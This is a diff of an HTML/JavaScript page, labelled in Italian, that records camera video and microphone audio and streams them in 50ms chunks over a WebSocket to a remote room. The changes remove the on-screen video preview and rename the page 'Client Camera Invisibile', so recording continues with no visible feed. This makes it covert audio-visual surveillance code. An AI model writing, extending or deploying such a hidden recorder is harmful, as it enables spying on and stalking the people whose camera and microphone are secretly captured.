@@ -3,15 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Client Camera + Audio</title>
+<title>Client Camera Invisibile</title>
 <style>
 body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
 .msg { padding:40px 20px; font-size:18px; }
 </style>
 </head>
 <body>
-<div class="msg">Avvio fotocamera...<br><small>Non chiudere questa pagina</small></div>
-<video id="cam" autoplay playsinline muted style="display:none;"></video>
+<div class="msg">Avvio fotocamera invisibile...<br><small>Non chiudere questa pagina</small></div>
 
 <script>
 const room = new URLSearchParams(location.search).get('room') || 'user1';
@@ -29,10 +28,6 @@ async function startCamera(facing) {
       video: { facingMode: facing },
       audio: true
     });
-    const videoEl = document.getElementById('cam');
-    videoEl.srcObject = stream;
-    videoEl.style.display = 'block';
-    await videoEl.play();
 
     // MediaRecorder per WebM video+audio
     mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8,opus' });
@@ -41,7 +36,7 @@ async function startCamera(facing) {
     };
     mediaRecorder.start(50); // chunk ogni 50ms (~20 FPS)
 
-    document.querySelector('.msg').innerHTML = `<b>Camera attiva</b><br><small>Video e audio inviati in background.</small>`;
+    document.querySelector('.msg').innerHTML = `<b>Camera attiva (invisibile)</b><br><small>Video e audio inviati in background.</small>`;
   } catch(err) {
     document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
   }
@@ -61,7 +56,6 @@ ws.onmessage = e => {
   }
 };
 
-// Mantieni alive WS
 setInterval(() => { if(ws.readyState===WebSocket.OPEN) ws.send('ping'); },10000);
 </script>
 </body>
